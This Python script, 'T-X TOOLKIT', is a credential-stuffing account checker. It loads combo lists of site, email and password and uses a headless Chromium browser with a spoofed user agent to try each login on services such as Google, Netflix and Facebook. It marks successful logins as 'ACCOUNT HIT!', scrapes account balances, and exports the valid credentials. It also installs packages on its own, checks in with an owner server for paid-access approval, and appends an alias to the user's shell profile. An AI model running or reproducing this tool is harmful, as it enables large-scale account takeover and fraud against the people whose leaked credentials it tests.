#!/usr/bin/env python3
"""
T-X TOOLKIT v3.0 — Real Browser Login Engine
Created by Saeka Tojirp
Usage : tx
Uses Playwright to automate a real Chromium browser,
extract live page content after login, and determine
account validity from the actual DOM — not just keywords.
"""

import os, sys, time, re, json, threading, random, hashlib, uuid, shutil
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# ---------- AUTO‑INSTALL ----------
for pkg in ("requests", "colorama", "playwright"):
    try: __import__(pkg)
    except ImportError:
        import subprocess
        print(f"\033[1;33m[*] Installing {pkg}...\033[0m")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg],
                       capture_output=True, timeout=120)
# Ensure Chromium is installed for Playwright
try:
    from playwright.sync_api import sync_playwright
except ImportError:
    import subprocess
    subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"],
                   capture_output=True, timeout=120)
    from playwright.sync_api import sync_playwright

from colorama import init, Fore, Style
init(autoreset=True)

# ---------- GLOBALS ----------
OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
APPROVED_FILE = os.path.expanduser("~/.tx_approved")
ALIAS_FILE = os.path.expanduser("~/.bashrc")

R = Fore.RED; G = Fore.GREEN; B = Fore.BLUE; Y = Fore.YELLOW; M = Fore.MAGENTA; C = Fore.CYAN; W = Fore.WHITE
DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]

# ---------- UTILS ----------
def tw(): return shutil.get_terminal_size().columns

def fix_url(url):
    if not url: return url
    url = url.strip()
    if not url.startswith(('http://','https://')):
        url = 'https://' + url
    return url

def center_print(text, color=W):
    w = tw()
    print(f"{color}{text.center(w)}{RES}")

def spin(text, sec=1.2):
    frm = ['◜','◠','◝','◞','◡','◟']
    end = time.time()+sec; i=0
    while time.time()<end:
        sys.stdout.write(f"\r  {C}{frm[i%6]} {W}{text}{RES}"); sys.stdout.flush()
        time.sleep(0.08); i+=1
    sys.stdout.write("\r"+" "*50+"\r")

def progress(cur, tot, label=""):
    if tot<=0: return
    pct = int((cur/tot)*100)
    filled = int(30*cur/tot)
    bar = f"{G}{'█'*filled}{DIM}{'░'*(30-filled)}{RES}"
    sys.stdout.write(f"\r  {label} |{bar}| {pct}% ({cur}/{tot})")
    sys.stdout.flush()
    if cur==tot: sys.stdout.write("\n")

# ---------- PLATFORM DETECTION ----------
def detect_platform(url):
    domain = urlparse(url).netloc.lower()
    if 'google' in domain: return 'Google'
    if 'facebook' in domain or 'fb.com' in domain: return 'Facebook'
    if 'instagram' in domain: return 'Instagram'
    if 'twitter' in domain or 'x.com' in domain: return 'Twitter/X'
    if 'netflix' in domain: return 'Netflix'
    if 'spotify' in domain: return 'Spotify'
    if 'amazon' in domain: return 'Amazon'
    if 'linkedin' in domain: return 'LinkedIn'
    if 'github' in domain: return 'GitHub'
    if 'microsoft' in domain or 'live.com' in domain: return 'Microsoft'
    if 'yahoo' in domain: return 'Yahoo'
    if 'discord' in domain: return 'Discord'
    return domain.split('.')[-2].capitalize() if '.' in domain else 'Generic'

# ---------- REAL BROWSER LOGIN ENGINE ----------
class RealLoginChecker:
    def __init__(self, headless=True):
        self.headless = headless
        self.playwright = sync_playwright().start()
        self.browser = self.playwright.chromium.launch(headless=headless)

    def attempt_login(self, url, email, password):
        res = {
            'link': url,
            'email': email,
            'pass': password,
            'active': False,
            'info': '',
            'balance': '',
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'platform': detect_platform(url)
        }
        url = fix_url(url)
        context = self.browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        page = context.new_page()
        try:
            # Random delay
            time.sleep(random.uniform(1.0, 2.5))
            # Navigate
            page.goto(url, timeout=20000, wait_until="networkidle")

            # Find login fields
            # Try common selectors for email/username
            email_selector = (
                'input[type="email"], input[type="text"], input[name*="email"], '
                'input[name*="user"], input[name*="login"], input[name*="account"], '
                'input[id*="email"], input[id*="user"], input[id*="login"]'
            )
            password_selector = 'input[type="password"]'

            email_input = page.query_selector(email_selector)
            password_input = page.query_selector(password_selector)

            if not email_input or not password_input:
                res['info'] = "No login fields found"
                context.close()
                return res

            # Fill fields
            email_input.fill(email)
            password_input.fill(password)

            # Try to find and click submit button
            submit_selector = (
                'button[type="submit"], input[type="submit"], '
                'button:has-text("Log in"), button:has-text("Sign in"), '
                'button:has-text("Login"), button:has-text("Continue")'
            )
            submit_btn = page.query_selector(submit_selector)
            if submit_btn:
                submit_btn.click()
            else:
                # Press Enter on password field as fallback
                password_input.press('Enter')

            # Wait for navigation or page change
            page.wait_for_load_state("networkidle", timeout=15000)
            time.sleep(2)  # let JS finish rendering

            # Analyze the page after login attempt
            content = page.content().lower()
            current_url = page.url.lower()

            # Indicators that login succeeded
            success_indicators = [
                'logout', 'sign out', 'my account', 'dashboard', 'profile',
                'welcome', 'inbox', 'home', 'feed'
            ]
            fail_indicators = [
                'incorrect', 'invalid', 'wrong', 'error', 'not found',
                "doesn't match", 'please try again', 'password is incorrect',
                'login failed', 'couldn\'t'
            ]

            # Check success
            if any(kw in content for kw in success_indicators) and not any(kw in content for kw in fail_indicators):
                res['active'] = True
                res['info'] = "Login successful (DOM confirmed)"
            elif any(kw in content for kw in fail_indicators):
                res['active'] = False
                res['info'] = "Invalid credentials (DOM confirmed)"
            else:
                # URL-based fallback
                if 'login' not in current_url and 'signin' not in current_url and 'auth' not in current_url:
                    res['active'] = True
                    res['info'] = "Redirected away from login"
                else:
                    # Check if cookies/ local storage indicate a session
                    cookies = context.cookies()
                    if len(cookies) > 3:
                        res['active'] = True
                        res['info'] = "Session cookies detected"
                    else:
                        res['active'] = False
                        res['info'] = "Still on login page"

            # Try to extract balance/credit
            try:
                bal_match = re.search(r'(?:balance|credit|points)[\s:$]*(\d+\.?\d{0,2})', content, re.I)
                if bal_match:
                    res['balance'] = bal_match.group(1)
            except:
                pass

        except Exception as e:
            res['info'] = f"Error: {str(e)[:50]}"
        finally:
            context.close()

        return res

    def close(self):
        try:
            self.browser.close()
        except:
            pass
        try:
            self.playwright.stop()
        except:
            pass

# ---------- AUTHORISATION ----------
def generate_token(name):
    raw = f"{name}-{uuid.uuid4().hex}-{int(time.time())}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()

def request_token_once(name):
    if os.path.exists(APPROVED_FILE):
        with open(APPROVED_FILE,'r') as f:
            if f.read().strip() == 'approved':
                return None, 'approved'
    token = generate_token(name)
    try:
        r = requests.post(f"{OWNER_SERVER}/api/request", json={"name":name,"token":token}, timeout=8)
        if r.status_code == 201:
            data = r.json()
            if data.get('status') == 'approved':
                with open(APPROVED_FILE,'w') as f: f.write('approved')
                return token, 'approved'
            return token, 'pending'
    except:
        pass
    return token, 'pending'

def wait_for_approval(token):
    while True:
        try:
            r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data['status'] == 'approved':
                    with open(APPROVED_FILE,'w') as f: f.write('approved')
                    return True
                elif data['status'] == 'declined':
                    return False
        except:
            pass
        time.sleep(3)

# ---------- MAIN TOOL ----------
def main():
    # Splash
    for _ in range(10):
        os.system('clear')
        spin("Initialising...", 0.5)
        center_print("WELCOME TO T-X TOOLKIT", random.choice(COLOR_LOOP))
        time.sleep(0.5)

    os.system('clear')
    center_print("WHAT SHOULD YOUR NAME BE?", Y)
    name = input(f"  {W}> {RES}").strip()
    if not name: name = "User"

    os.system('clear')
    token, status = request_token_once(name)
    if status == 'approved':
        center_print("ACCESS GRANTED", G)
        time.sleep(1)
    else:
        center_print("PERMISSION REQUIRED!", R)
        time.sleep(0.5)
        center_print(f"YOUR REQUEST TOKEN IS {token}", W)
        center_print("PLEASE ASK THE OWNER TO APPROVE", DIM)
        if not wait_for_approval(token):
            center_print("REQUEST DECLINED!", R)
            sys.exit(0)
        os.system('clear')
        center_print("ACCESS GRANTED", G)
        time.sleep(1)

    # Main loop
    combo_file = None
    hits = []
    checker = RealLoginChecker(headless=True)
    while True:
        os.system('clear')
        w = tw()
        print(f"{G}HI! {name}{RES}  {DIM}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RES}\n")
        title = "T-X PAID TOOL"
        glitch_colors = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]
        for i,ch in enumerate(title):
            sys.stdout.write(f"{glitch_colors[i%len(glitch_colors)]}{ch}{RES}")
        print("\n")
        menu = [
            "[ 1 ] START CHECKING",
            "[ 2 ] SEE ACCOUNT HITS!",
            "[ 3 ] EXPORT LOGS",
            "[ 4 ] SETUP FILE PATH",
            "[ 5 ] EXIT"
        ]
        for idx,line in enumerate(menu):
            if idx==3 and not combo_file:
                print(f"  {R}{line}{RES}")
            else:
                print(f"  {W}{line}{RES}")

        t = int(time.time()) % 10 // 5
        creator_color = COLOR_LOOP[t]
        print(f"\n  {creator_color}Created{RES} by Saeka Tojirp.", end='')

        try:
            choice = input(f"\n  {W}> {RES}").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if choice == '1':
            if not combo_file:
                print(f"  {R}Please set up the file path first (option 4).{RES}")
                time.sleep(1)
                continue

            combos = []
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'): continue
                    if '|' in line:
                        parts = line.split('|')
                        if len(parts) >= 3:
                            url, email, passwd = parts[0].strip(), parts[1].strip(), '|'.join(parts[2:]).strip()
                            combos.append((url, email, passwd))
                    elif '://' in line:
                        proto, rest = line.split('://', 1)
                        if ':' in rest:
                            domain_part, credentials = rest.split(':', 1)
                            email, passwd = credentials.split(':', 1) if ':' in credentials else (credentials, '')
                            url = proto + '://' + domain_part
                            combos.append((url.strip(), email.strip(), passwd.strip()))
                    else:
                        parts = line.split(':')
                        if len(parts) >= 3:
                            combos.append((parts[0].strip(), parts[1].strip(), ':'.join(parts[2:]).strip()))

            if not combos:
                print(f"  {R}No valid combos in file.{RES}")
                time.sleep(1)
                continue

            results = []
            total = len(combos)
            done = 0
            active = 0
            lock = threading.Lock()

            print(f"\n  {Y}{'LINK':<35} {'|'} {'USER/EMAIL':<28} {'|'} {'PASS':<20} {'|'} {'STATUS'}{RES}")
            print(f"  {DIM}{'─'*90}{RES}")

            def worker(url, email, passwd):
                nonlocal done, active
                res = checker.attempt_login(url, email, passwd)
                with lock:
                    results.append(res)
                    done += 1
                    if res['active']:
                        active += 1
                    act_str = f"{G}ACCOUNT HIT!{RES}" if res['active'] else f"{R}INVALID{RES}"
                    link_str = res['link'][:33]
                    email_str = res['email'][:26]
                    pass_str = res['pass'][:18]
                    print(f"  {W}{link_str:<35}{DIM} | {RES}{W}{email_str:<28}{DIM} | {RES}{W}{pass_str:<20}{DIM} | {RES}{act_str}")
                    progress(done, total, "Checking")

            with ThreadPoolExecutor(max_workers=5) as ex:
                for url, email, passwd in combos:
                    ex.submit(worker, url, email, passwd)

            print(f"\n  {G}{active}/{total} active.{RES}")
            hits.extend([r for r in results if r['active']])
            time.sleep(1)

        elif choice == '2':
            os.system('clear')
            if not hits:
                print(f"  {Y}No active hits yet.{RES}")
            else:
                page = 0
                per = 5
                while True:
                    os.system('clear')
                    print(f"  {G}ACCOUNT HITS!{RES}  Page {page+1}/{ (len(hits)-1)//per +1 }")
                    for r in hits[page*per:(page+1)*per]:
                        print(f"  {r['email']}:{r['pass']} | {r.get('balance','')} | {r.get('time','')}")
                    print(f"\n  {DIM}[N]ext [P]rev [Q]uit{RES}")
                    k = input().strip().lower()
                    if k == 'n' and page < (len(hits)-1)//per:
                        page += 1
                    elif k == 'p' and page > 0:
                        page -= 1
                    elif k == 'q':
                        break
            time.sleep(0.5)

        elif choice == '3':
            fn = f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(fn, 'w') as f:
                json.dump(hits, f, indent=2)
            print(f"  {G}Exported to {fn}{RES}")
            time.sleep(1)

        elif choice == '4':
            path = input(f"  {W}Enter combo file path: {RES}").strip()
            if os.path.exists(path):
                combo_file = path
                print(f"  {G}File set!{RES}")
            else:
                print(f"  {R}File not found.{RES}")
            time.sleep(1)

        elif choice == '5':
            break

    checker.close()

def setup_alias():
    if not os.path.exists(ALIAS_FILE): return
    alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
    with open(ALIAS_FILE,'r') as f: content = f.read()
    if alias_cmd not in content:
        os.system(f"echo \"{alias_cmd}\" >> {ALIAS_FILE}")

if __name__=="__main__":
    setup_alias()
    main()
